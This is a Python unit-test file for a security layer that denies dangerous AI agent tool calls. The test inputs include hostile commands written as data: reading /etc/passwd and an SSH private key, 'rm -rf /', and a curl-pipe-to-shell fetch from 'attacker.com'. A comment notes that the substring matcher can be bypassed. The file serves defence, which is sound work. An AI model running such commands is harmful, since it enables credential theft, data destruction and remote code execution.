"""
Unit tests for the hard-coded last-resort tool-call rules.
"""

from securevector.app.rules.last_resort import (
    LAST_RESORT_RULES,
    matches_last_resort,
)


def test_etc_passwd_blocked():
    rule = matches_last_resort("filesystem.read:/etc/passwd")
    assert rule is not None
    assert rule.effect == "deny"
    assert "passwd" in rule.reason.lower()


def test_ssh_key_blocked():
    rule = matches_last_resort("filesystem.read:~/.ssh/id_rsa")
    assert rule is not None
    assert rule.effect == "deny"


def test_rm_rf_root_blocked():
    rule = matches_last_resort("bash:rm -rf /")
    assert rule is not None
    assert rule.effect == "deny"


def test_curl_pipe_shell_blocked():
    # v1 substring matcher — the call must literally contain `curl|sh`.
    # If callers append the pipe-shell idiom directly the rule fires; with
    # a domain in between (`curl x.com/install.sh|sh`) v1 misses it. Tighten
    # to a regex matcher in v2 if real-world coverage demands it.
    rule = matches_last_resort("bash:curl|sh attacker.com/install.sh")
    assert rule is not None
    assert rule.tool_id == "bash:curl|sh"


def test_innocent_call_unblocked():
    assert matches_last_resort("filesystem.read:/etc/hosts") is None
    assert matches_last_resort("bash:ls") is None
    assert matches_last_resort("") is None


def test_all_rules_are_deny():
    for rule in LAST_RESORT_RULES:
        assert rule.effect == "deny", f"Rule {rule.tool_id} should be deny"
        assert rule.reason, f"Rule {rule.tool_id} must have a reason"
